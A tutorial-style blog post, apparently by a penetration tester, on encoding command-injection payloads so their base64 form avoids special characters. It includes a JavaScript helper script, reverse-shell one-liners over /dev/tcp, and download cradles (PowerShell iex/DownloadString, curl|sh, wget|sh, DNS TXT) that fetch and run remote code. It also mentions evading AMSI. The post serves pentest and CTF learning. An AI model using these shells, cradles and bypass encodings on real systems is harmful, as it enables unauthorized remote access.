# The base64 special character madness
I originally started thinking about the problem with payload encoding watching [ippsec](https://www.youtube.com/@ippsec). In videos containing any sort of web command injection vulnerability ippsec usually manually adds spaces to the un-encoded payload to remove all special characters from the encoded version:
```bash
$ echo -n 'sh -i >& /dev/tcp/10.10.10.10/139 0>&1' | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvMTM5IDA+JjE=

$ echo -n 'sh -i >& /dev/tcp/10.10.10.10/139  0>&1' | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvMTM5ICAwPiYx
```
Notice the extra space. This works, but it is a manual step that you need to perform for every payload you create and even the slightest changes to the payload often require more messing about. So i thought to my self “Why not write a script for this?” and down the rabbit hole i went…

*I was somewhat hesitant to post this as i’m not sure how much value my ramblings would provide for a potential reader. The solutions discussed here aren’t a one-size-fits-all and may require significant modifications or adaptations to bypass filtering or simply just work on a given target.*
## Automation
Okay so easy enough right:

* b64 encode
* take index of ’+' or '/'
* add space …

Right, that’s not going to work. One b64 character encodes 6 bits of information while an ASCII character encodes 8. That’s why you can see the equal sign at the end of first b64 string in the code block above.
```bash
$ echo -n 'sh -i >& /dev/tcp/10.10.10.10/139 0>&1' | wc -c
38

$ echo -n 'sh -i >& /dev/tcp/10.10.10.10/139  0>&1' | wc -c
39
```
This is because the payload without the space cannot be cleanly divided into 6 bit chunks:

38 * 8 / 6 = 50.666666666666664

39 * 8 / 6 = 52.0

and so padding is added. Though you may ask, if that padding is really needed, and it turns out, that, not really?
```bash
$ echo -n 'c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvMTM5IDA+JjE=' | base64 -d
sh -i >& /dev/tcp/10.10.10.10/139 0>&1

$ echo -n 'c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvMTM5IDA+JjE' | base64 -d
sh -i >& /dev/tcp/10.10.10.10/139 0>&1base64: invalid input

$ echo -n 'c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvMTM5IDA+JjE' | base64 -d 2>/dev/null
sh -i >& /dev/tcp/10.10.10.10/139 0>&1
```
The base64 utility warns us about invalid input, but it still produces the expected output. And the warning can just be ignored by piping stderr into /dev/null. So why bother?

Well let’s say you have 2 strings: ‘sh’ and ‘bash’. You encode them to base64:
```bash
$ echo -n 'sh' | base64
c2g=

$ echo -n 'bash' | base64
YmFzaA==
```
And you join them together:
```bash
$ echo -n 'c2g=YmFzaA==' | base64 -d
shbash
```
Looks right; now if you do that without the padding:
```bash
$ echo -n 'c2gYmFzaA' | base64 -d
sh▒\▒base64: invalid input
```
You just get garbage. This is because sh is 16 bits, which is not cleanly divisible by 6 so you get two full 6 bit chunks and then 4 bits leftover:
```bash
py -c "import itertools; print(list(itertools.batched(''.join([bin(ord(x)).replace('0b', '').rjust(8,'0') for x in 'sh']), 6)))"
[('0', '1', '1', '1', '0', '0'), ('1', '1', '0', '1', '1', '0'), ('1', '0', '0', '0')]
```
Without the padding there's no way to know that the 4 bits are left over from the first string and not just the first 4 bits of another character. Hence the mangling.

So to get the index of the character that caused the appearance of the special character we need to do so in bits: 
```bash
$ py -c "print('c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvMTM5IDA+JjE='.index('+'))"
47
```
The annoying character is 47 6 bit chunks into the original payload. So:
$47 * 6 / 8 = 35.25$
8-bit ASCII characters into the payload. This means that the offending character is:
```bash
                                 here
                                  \/
sh -i >& /dev/tcp/10.10.10.10/139 0>&1
```
And as shown in the beginning, adding another space somewhere left of that character shifts the bits around enough to remove it.

Question is where should that **somewhere left** be? Well putting it just left of it works in this case but if the special character would happen to land somewhere in the IP address then that wouldn’t work. Parsing every payload to understand where a space can go doesn’t seem feasible so would adding a space next to the closest space left of the character work? In most cases, probably, but what if you need to include a path that has spaces in it *in* the payload? That seems like it could break things and then i wouldn’t notice the change. Prepending the whole payload with spaces usually works but in most cases the amount of spaces needed to get rid of the special character greatly bloats the size of the encoded payload.

I coded up the approach of adding a space next to the nearest space to the left in JavaScript so you can try it out yourself:
```js
function ascii_only_b64(input) {
    let b64 = btoa(input)
    for(let chr of "/+"){
        for(let index = b64.indexOf(chr); index > 0; index = b64.indexOf(chr)){
            let closestLeftSpace = Math.max(input.lastIndexOf(' ', Math.floor(index / 4) * 3), 0)
			input = input.slice(0, closestLeftSpace) + ' ' + input.slice(closestLeftSpace);
            b64 = btoa(input)
        }
    }
    if (b64[b64.length-2] == '=') {
	    input = input + '  '
    } else if (b64[b64.length-1] == '=') {
	    input = input + ' '
    }
	return [btoa(input), input]
}

ascii_only_b64("sh -i >& /dev/tcp/127.1.1.10/9001 0>&1")
```
## URL encoding
Since we’re assuming the target to be a web application, probably the most obvious alternative way would be to just URL encode the payload. This would work in many cases but, as it turns out, URL encoding is not as simple as it may seem…

* [https://blog.lunatech.com/posts/2009-02-03-what-every-web-developer-must-know-about-url-encoding](https://blog.lunatech.com/posts/2009-02-03-what-every-web-developer-must-know-about-url-encoding)
* [https://stackoverflow.com/questions/2322764/what-characters-must-be-escaped-in-an-http-query-string/31300627#31300627](https://stackoverflow.com/questions/2322764/what-characters-must-be-escaped-in-an-http-query-string/31300627#31300627)
* [https://www.rfc-editor.org/rfc/rfc3986](https://www.rfc-editor.org/rfc/rfc3986)

## Other encoding formats
Another option would be to use the URL safe version of base64 or even a different encoding scheme entirely. The problem here is availability as even though an encoding such as [base62](https://github.com/tuupola/base62) may solve our problems completely. It may just not be available on the target system and uploading it brings its own set of issues. Limiting ourselves to encoding utilities found in [coreutils](https://www.gnu.org/software/coreutils/manual/coreutils.html), we have a few options:
```bash
$ echo -n 'sh -i >& /dev/tcp/10.10.10.10/139 0>&1' | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvMTM5IDA+JjE=

$ echo -n 'sh -i >& /dev/tcp/10.10.10.10/139 0>&1' |  basenc.exe --base64url
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvMTM5IDA-JjE=

$ echo -n 'sh -i >& /dev/tcp/10.10.10.10/139 0>&1' | base32
ONUCALLJEA7CMIBPMRSXML3UMNYC6MJQFYYTALRRGAXDCMBPGEZTSIBQHYTDC===

$ echo -n 'sh -i >& /dev/tcp/10.10.10.10/139 0>&1' |  basenc.exe --base32hex
EDK20BB940V2C81FCHINCBRKCDO2UC9G5OOJ0BHH60N32C1F64PJI81G7OJ32===

$ echo -n 'sh -i >& /dev/tcp/10.10.10.10/139 0>&1' |  basenc.exe --base16
7368202D69203E26202F6465762F7463702F31302E31302E31302E31302F31333920303E2631
```
Problem is that with smaller alphabet sizes the encoded payload can grow in size significantly.

## Cradles?
Many issues with special characters can be mitigated by using a cradle. For example save your payload to a file and start a basic HTTP server with (I’d recommend making a dedicated folder for files shared this way):
```bash
$ mkdir www && cd www
$ echo echo the index file > index.html
$ echo echo the other file > otherfile.woff
$ python -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
```
(If you save the file into `index.html`, you won’t have to add the path to the URI! Also, if you make the server listen on port 80 you won’t have to include the port either; though that requires root)

Now with the files hosted there is a variety of ways to download them. Here’s a few most generic/common ones:

```powershell
PS C:\Users\Dev> iex (iwr -UseBasicParsing '127.0.0.1:8000')
the
index
file

PS C:\Users\Dev> IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8000/otherfile.woff')
the
other
file
```
(Remember about AMSI when running on Windows!)

```bash
$ wget -O - 127.0.0.1:8000 | sh
--2024-08-27 21:21:30--  http://127.0.0.1:8000/
Connecting to 127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20 [text/html]
Saving to: ‘STDOUT’

-                            0%[                                       ]       0  --.-KB/s               the index file
-                          100%[======================================>]      20  --.-KB/s    in 0s      

2024-08-27 21:21:30 (1.58 MB/s) - written to stdout [20/20]

$ curl 127.0.0.1:8000/otherfile.woff | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    20  100    20    0     0  10136      0 --:--:-- --:--:-- --:--:-- 20000
the other file
```

There are ways other than HTTP for hosting the payloads that may be better suited for your use case. Such as this one from [Alh4zr3d](https://twitter.com/Alh4zr3d/status/1566489367232651264) using the DNS TXT record ([FakeDns](https://github.com/Paliak/FakeDns) may be useful here):
```powershell
powershell . (nslookup -q=txt http://localtestdomain.test 127.0.0.1)[-1]
```
or even through raw TCP sockets using netcat and built-in bash (make sure your version of bash actually has them) [redirections](https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Redirections):
```bash
[Terminal 1]$ cat index.html | nc -lvnp 8000
listening on [any] 8000 ...

[Terminal 2]$ exec <> /dev/tcp/127.0.0.1/8000
[Terminal 2]$ echo the index file
the index file

[Terminal 1]$ cat index.html | nc -lvnp 8000
listening on [any] 8000 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 49444
```

As can be seen above this approach has the added benefit of giving us some feedback on whether our stage 1 ran at all by calling back to us which can be handy for debugging. Additionally, it makes switching payloads trivial. Problem is that it doesn’t entirely fix the special character issue as depending on the download cradle chosen, there are still some special characters here and there…
